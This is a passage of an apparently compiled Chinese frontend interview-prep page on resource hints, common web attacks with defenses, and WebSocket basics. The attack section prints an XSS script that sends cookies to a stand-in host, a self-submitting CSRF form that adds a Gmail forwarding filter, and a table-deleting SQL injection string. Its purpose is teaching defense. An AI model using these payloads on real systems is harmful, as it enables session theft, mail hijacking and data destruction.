</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="连环问-dns-prefetch-和-preconnect-有什么作用" tabindex="-1"><a class="header-anchor" href="#连环问-dns-prefetch-和-preconnect-有什么作用" aria-hidden="true">#</a> 连环问：dns-prefetch 和 preconnect 有什么作用？</h3><p>一个 http 请求，第一步就是 DNS 解析得到 IP ，然后进行 TCP 连接。连接成功后再发送请求。</p><p>dns-prefetch 即 DNS 预查询，preconnect 即预连接。<br> 当网页请求<strong>第三方</strong>资源时，可以提前进行 DNS 查询、TCP 连接，以减少请求时的时间。</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>dns-prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://fonts.gstatic.com/<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preconnect<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://fonts.gstatic.com/<span class="token punctuation">&quot;</span></span> <span class="token attr-name">crossorigin</span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="答案-6" tabindex="-1"><a class="header-anchor" href="#答案-6" aria-hidden="true">#</a> 答案：</h4><ul><li>prefetch 是资源预获取（和 preload 相关）</li><li>dnd-prefetch 是 DNS 预查询（和 preconnect 相关）</li></ul><h2 id="_09-前端攻击手段有哪些-该如何预防" tabindex="-1"><a class="header-anchor" href="#_09-前端攻击手段有哪些-该如何预防" aria-hidden="true">#</a> 09：前端攻击手段有哪些，该如何预防</h2><h3 id="题目-6" tabindex="-1"><a class="header-anchor" href="#题目-6" aria-hidden="true">#</a> 题目</h3><p>你所了解的前端攻击手段有哪些，该如何预防？</p><h3 id="xss" tabindex="-1"><a class="header-anchor" href="#xss" aria-hidden="true">#</a> XSS</h3><p>Cross Site Scripting 跨站脚本攻击</p><p>用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。<br> 该内容再显示时，这些代码也将会被执行，形成了攻击效果。</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token comment">&lt;!-- 例如用户提交的内容中有： --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&#39;img&#39;</span><span class="token punctuation">)</span>
  img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&#39;http://xxx.com/api/xxx?userInfo=&#39;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie <span class="token comment">// 将 cookie 提交到自己的服务器</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>最简单的解决方式：替换特殊字符</strong></p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">const</span> newStr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">&#39;&lt;&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&amp;lt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">&#39;&gt;&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&amp;gt;&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>也可以使用第三方工具，例如</p>`,66),L={href:"https://www.npmjs.com/package/xss",target:"_blank",rel:"noopener noreferrer"},H={href:"https://www.npmjs.com/package/escape-html",target:"_blank",rel:"noopener noreferrer"},N=e(`<p>现代框架默认会屏蔽 XSS 攻击，除非自己手动开启</p><ul><li>Vue <code>v-html</code></li><li>React <code>dangerouslySetInnerHTML</code></li></ul><h3 id="csrf" tabindex="-1"><a class="header-anchor" href="#csrf" aria-hidden="true">#</a> CSRF</h3><p>Cross-site request forgery 跨站请求伪造</p><p>请看下面的故事</p><ul><li>小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”</li><li>小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了</li></ul><p>但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 <code>hacker@hackermail.com</code> 。<br> 因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cf2_emc<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cf2_email<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hacker@hakermail.com<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  .....
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>irf<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>on<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>nvp_bu_cftb<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Create Filter<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment">// PS：有些是 post 请求，有些是 get 请求</span>
  <span class="token comment">//     get 请求如果用 img.src 还可以规避跨域，更加危险</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>邮件经常用来接收验证码，这是很危险的事情。<br> 当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。</p><p>CSRF 的过程</p><ul><li>用户登录了 <code>a.com</code> ，有了 cookie</li><li>黑客引诱用户访问 <code>b.com</code> 网页，并在其中发起一个跨站请求 <code>a.com/api/xxx</code></li><li><code>a.com</code> API 收到 cookie ，误以为是真实用户的请求，就受理了</li></ul><p>CSRF 的预防</p><ul><li>严格的跨域请求限制,如判断 referrer(请求来源)</li><li>为 cookie 设置 <code>SameSite</code> 不随跨域请求被发送 <code>Set-Cookie: key1=val1; key2=val2; SameSite=Strict;</code></li><li>关键接口使用短信验证码等双重验证</li></ul><h3 id="点击劫持-clickjacking" tabindex="-1"><a class="header-anchor" href="#点击劫持-clickjacking" aria-hidden="true">#</a> 点击劫持 Clickjacking</h3><p>小明被诱导到一个钓鱼网站，点击了一个按钮，其实已经关注了慕课网双越老师。因为他可能已经登录了慕课网。<br> 这可以是关注，也可以是付款转账等其他危险操作。</p><p><img src="`+f+`" alt=""></p><p>点击劫持的原理：黑客在自己的网站，使用隐藏的 <code>&lt;iframe&gt;</code> 嵌入其他网页，诱导用户按顺序点击。</p><ul><li><p>使用 JS 预防</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname <span class="token operator">!==</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;您正在访问不安全的页面，即将跳转到安全页面！&#39;</span><span class="token punctuation">)</span>
  top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>增加 http header <code>X-Frame-Options:SAMEORIGIN</code> ，让 <code>&lt;iframe&gt;</code> 只能加载同域名的网页。</p></li></ul><p>PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。</p><h3 id="ddos" tabindex="-1"><a class="header-anchor" href="#ddos" aria-hidden="true">#</a> DDoS</h3><ul><li>Distributed denial-of-service 分布式拒绝服务</li><li>手段：分布式的、大规模的流量访问，使服务器瘫痪</li><li>预防：软件层不好做，需要硬件预防（如阿里云 WAF）</li></ul><p>通过大规模的网络流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。<br> 类似于恶意堵车，妨碍正常车辆通行。</p><p>网络上的设备感染了恶意软件，被黑客操控，同时向一个域名或者 IP 发送网络请求。因此形成了洪水一样的攻击效果。<br> 由于这些请求都来自分布在网络上的各个设备，所以不太容易分辨合法性。</p>`,23),R={href:"https://www.aliyun.com/product/waf?spm=5176.7967425.J_8058803260.34.3d017748VkTlhL",target:"_blank",rel:"noopener noreferrer"},B={href:"https://www.ruanyifeng.com/blog/2018/06/ddos.html",target:"_blank",rel:"noopener noreferrer"},z=e(`<h3 id="sql-注入" tabindex="-1"><a class="header-anchor" href="#sql-注入" aria-hidden="true">#</a> SQL 注入</h3><ul><li>手段：黑客提交内容时写入 SQL 语句，破坏数据库</li><li>预防：处理输入的内容，替换特殊字符</li></ul><p>普通的登录方式，输入用户名 <code>zhangsan</code> 、密码 <code>123</code> ，然后服务端去数据库查询。<br> 会执行一个 sql 语句 <code>select * from users where username=&#39;zhangsan&#39; and password=&#39;123&#39;</code> ，然后判断是否找到该用户。</p><p>如果用户输入的是用户名 <code>&#39; delete from users where 1=1; --</code> ，密码 <code>&#39;123&#39;</code><br> 那生成的 sql 语句就是 <code>select * from users where username=&#39;&#39; delete from users where 1=1; --&#39; and password=&#39;123&#39;</code><br> 这样就会把 <code>users</code> 数据表全部删除。</p><p>防止 SQL 注入：服务端进行特殊字符转换，如把 <code>&#39;</code> 转换为 <code>\\&#39;</code></p><h3 id="答案-7" tabindex="-1"><a class="header-anchor" href="#答案-7" aria-hidden="true">#</a> 答案</h3><ul><li>XSS</li><li>CSRF</li><li>点击劫持</li><li>DDoS</li><li>SQL 注入</li></ul><h3 id="划重点-2" tabindex="-1"><a class="header-anchor" href="#划重点-2" aria-hidden="true">#</a> 划重点</h3><ul><li>预防攻击，要各司其职，而不要依赖于其他角色（如后端）</li></ul><h2 id="_10-websocket-和-http-协议有什么区别" tabindex="-1"><a class="header-anchor" href="#_10-websocket-和-http-协议有什么区别" aria-hidden="true">#</a> 10: WebSocket 和 HTTP 协议有什么区别</h2><h3 id="题目-7" tabindex="-1"><a class="header-anchor" href="#题目-7" aria-hidden="true">#</a> 题目</h3><p>webSocket 和 http 协议有何区别？有和应用场景？</p><h3 id="websocket" tabindex="-1"><a class="header-anchor" href="#websocket" aria-hidden="true">#</a> WebSocket</h3><ul><li>支持端对端通讯</li><li>可以由 client 发起，也可以由 server 发起</li><li>用于：消息通知，直播间讨论区，聊天室，协同编辑</li></ul><h3 id="websocket-简介" tabindex="-1"><a class="header-anchor" href="#websocket-简介" aria-hidden="true">#</a> webSocket 简介</h3><p>webSocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。<br> 代码参考 ws-server 中 webSocket1.html webSocket2.html</p><h4 id="服务端" tabindex="-1"><a class="header-anchor" href="#服务端" aria-hidden="true">#</a> 服务端</h4><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">const</span> <span class="token punctuation">{</span> WebSocketServer <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;ws&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> wsServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">3000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
wsServer<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;connection&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">ws</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;connected&#39;</span><span class="token punctuation">)</span>

  ws<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;收到了信息&#39;</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment">// 服务端向客户端发送信息</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;服务端已经收到了信息: &#39;</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="客户端" tabindex="-1"><a class="header-anchor" href="#客户端" aria-hidden="true">#</a> 客户端</h4><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code>// webSocket1.html<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>IE=edge<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width, initial-scale=1.0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>websocket<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>websocket<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn-send<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>发送消息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&#39;ws://127.0.0.1:3000&#39;</span><span class="token punctuation">)</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;opened&#39;</span><span class="token punctuation">)</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;client opened&#39;</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;收到了信息&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">const</span> btnSend <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;btn-send&#39;</span><span class="token punctuation">)</span>
      btnSend<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;click&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;clicked&#39;</span><span class="token punctuation">)</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;当前时间&#39;</span> <span class="token operator">+</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>场景：消息通知，直播讨论区，聊天室，协同编辑</p><h3 id="websocket-建立连接" tabindex="-1"><a class="header-anchor" href="#websocket-建立连接" aria-hidden="true">#</a> webSocket 建立连接</h3><ul><li>会先发起一个 <code>http</code> 请求，根服务端建立连接。</li><li>连接成功之后再升级为 <code>webSocket 协议</code>，然后再通讯。</li></ul><p><img src="`+w+`" alt=""></p><h3 id="websocket-和-http-区别" tabindex="-1"><a class="header-anchor" href="#websocket-和-http-区别" aria-hidden="true">#</a> webSocket 和 http 区别</h3><ul><li>协议名称不同 <code>ws</code> 和 <code>http</code></li><li><code>http</code> 一般只能浏览器发起请求，<code>webSocket</code> 可以双端发起请求</li><li><code>webSocket</code> 无跨域限制</li><li><code>webSocket</code> 通过 <code>send</code> 和 <code>onmessage</code> 进行通讯，<code>http</code> 通过 <code>req</code> 和 <code>res</code> 通讯</li></ul><p>PS：<code>ws</code> 可以升级为 <code>wss</code> 协议，像 <code>http</code> 升级到 <code>https</code> 一样，增加 <code>SSL</code> 安全协议。</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> createServer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&#39;https&#39;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> readFileSync <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&#39;fs&#39;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> WebSocketServer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&#39;ws&#39;</span>

<span class="token keyword">const</span> server <span class="token operator">=</span> <span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token literal-property property">cert</span><span class="token operator">:</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">&#39;/path/to/cert.pem&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">&#39;/path/to/key.pem&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> wss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> server <span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="扩展" tabindex="-1"><a class="header-anchor" href="#扩展" aria-hidden="true">#</a> 扩展</h3>`,29),X={href:"https://www.npmjs.com/package/socket.io",target:"_blank",rel:"noopener noreferrer"},G=e(`<div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>io<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;connection&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// emit an event to the socket</span>
  socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">&#39;request&#39;</span> <span class="token comment">/* … */</span><span class="token punctuation">)</span>
  <span class="token comment">// emit an event to all connected sockets</span>
  io<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">&#39;broadcast&#39;</span> <span class="token comment">/* … */</span><span class="token punctuation">)</span>
  <span class="token comment">// listen to the event</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;reply&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">/* … */</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
